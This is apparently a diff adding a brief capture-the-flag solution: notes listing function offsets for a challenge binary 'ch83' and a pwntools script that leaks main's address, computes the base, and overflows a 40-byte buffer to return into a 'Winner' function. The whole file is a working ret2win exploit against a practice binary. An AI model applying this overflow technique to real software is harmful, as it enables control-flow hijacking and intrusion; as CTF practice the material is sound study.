@@ -1,0 +1,34 @@
+0x000000000000087a  Winner
+0x0000000000000903  Loser
+0x000000000000091a  main
+
+payload = "A" * 40
+
+go to /tmp/ and write exp.py 
+
+------------------------------------------------------------------
+
+main = 0x91a
+winner = 0x87a
+
+from pwn import *
+p = process("./ch83")
+
+p.recvuntil("main(): ")
+addr_main = int(p.recvline(), 16)
+offset = addr_main - main
+addr_winner = offset + winner
+
+print("Addr_main: ", hex(addr_main))
+print("Addr_winner: ", hex(addr_winner))
+
+# p.recvuntil("Key: ")
+payload = "A" * 40
+payload += p64(addr_winner)
+p.sendline(payload)
+print(p.recvlines(3))
+
+p.interactive()
+
+
+
